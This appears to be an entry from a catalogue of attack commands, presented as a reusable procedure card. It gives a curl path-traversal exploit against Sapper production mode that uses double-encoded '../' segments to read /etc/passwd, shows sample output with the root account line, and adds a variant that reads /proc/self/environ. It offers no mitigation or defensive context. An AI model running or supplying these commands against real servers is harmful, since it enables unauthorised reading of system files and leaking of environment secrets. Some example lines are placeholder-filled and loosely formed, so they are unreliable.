---
id: cmd-007
data: >-
  curl -vvv
  http://localhost:3000/client/750af05c3a69ddc6073a/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
tags:
  - exploit
  - curl
type: command
output: |-
  < HTTP/1.1 200 OK
  ... root:x:0:0:root:/root:/bin/bash
  (file contents)
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:11.510Z'
verified: false
validated: true
submitted: true
---
---

# curl-prod-path-traversal

## Command

```bash
curl -vvv http://localhost:3000/client/750af05c3a69ddc6073a/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
```

## Description

Sends a very verbose GET request to exploit path traversal in Sapper production mode, using double URL-encoded '../' (%252e%252e) to read /etc/passwd despite Polka's decoding.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-vvv` | Very verbose output | Yes |
| `http://localhost:3000/...` | URL with double encoding | Yes |

## Examples

### Basic Usage

```bash
curl -vvv http://localhost:3000/client/.../etc/passwd
```

### Advanced Usage

```bash
curl -vvv --data '' http://target/.../proc/self/environ
```

## Expected Output

Detailed HTTP exchange with file contents.

## Related

- [[Related Procedure: Exploit-Path-Traversal-in-Production-Mode]]

---
